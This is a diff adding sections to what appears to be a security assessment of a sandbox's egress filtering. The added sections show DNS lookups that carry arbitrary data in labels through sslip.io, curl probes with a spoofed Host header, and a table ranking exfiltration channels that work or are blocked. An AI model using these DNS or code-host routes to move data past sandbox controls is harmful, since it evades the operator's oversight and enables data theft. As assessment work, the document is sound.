@@ -285,6 +285,58 @@ exfiltrating tenant's best-case environment; a list that includes only mirrors o
 packages is not. The difference is not the length of the list, it is whether any entry lets a user
 publish bytes.
 
+### 6.6 The resolver is a working bidirectional channel, demonstrated
+
+The DNS claim in §6.3 rested on "the query went out", which is weak. It can be made concrete without
+controlling a domain, because a wildcard service will echo whatever is in the label:
+
+```console
+$ getent ahostsv4 203.0.113.7.sslip.io
+203.0.113.7
+
+$ getent ahostsv4 1ba18fb4358b380f.203.0.113.99.sslip.io
+203.0.113.99
+```
+
+The label — and in the second case an arbitrary 64-bit value inside it — traversed the platform's
+resolver, reached an authoritative nameserver, and the answer came back. That is a full round trip
+carrying attacker-chosen data, on a channel no TCP policy in this sandbox observes. With a domain the
+squatter controls, the same path carries a command and a result per query.
+
+### 6.7 Plain HTTP is filtered too, and by the Host header
+
+The obvious hope was that a name filter would miss cleartext, since there is no SNI to read. It does
+not:
+
+```console
+$ curl -o /dev/null -w '%{http_code}' http://example.com/
+403
+$ curl -H 'Host: example.com' http://140.82.121.3/
+403
+```
+
+Every non-allowlisted name returns `403`, on both the real address and an allowlisted address, so the
+proxy reads the `Host` header when there is no TLS. That is a better implementation than most: the
+control is name-based at both layers, so neither "use HTTP" nor "reuse an allowed IP" gets anywhere.
+
+### 6.8 Where red actually wins
+
+Ranked by what they cost the platform, not by cleverness:
+
+| channel | status | what it needs |
+|---|---|---|
+| **DNS** | **works, demonstrated round trip** | a domain and an authoritative nameserver; no port policy sees it |
+| **GitHub / Hugging Face** | **read proven, write needs a token** | any account on either platform |
+| SNI decoy to another address | does not help — the address is ignored, the name is dialled | — |
+| plain HTTP | blocked by `Host`, same as TLS | — |
+| platform supervisor sockets | `404` on `CONNECT` | — |
+| IMDS | `403` on every path | a credential shape it wants, not guessed |
+
+So the answer to "can the tenant get data out" is **yes, twice**, and both routes are things a
+package-manager allowlist cannot remove: the resolver, and the code hosting the packages live on. The
+sandbox is not airtight. It is narrow enough that the squatter has to spend an account and a domain to
+use it, which is a real cost and the right kind of cost, but it is not a wall.
+
 ## 7. What this does not prove
 
 - **That the reset comes from a proxy rather than the destination.** A consistent reset after
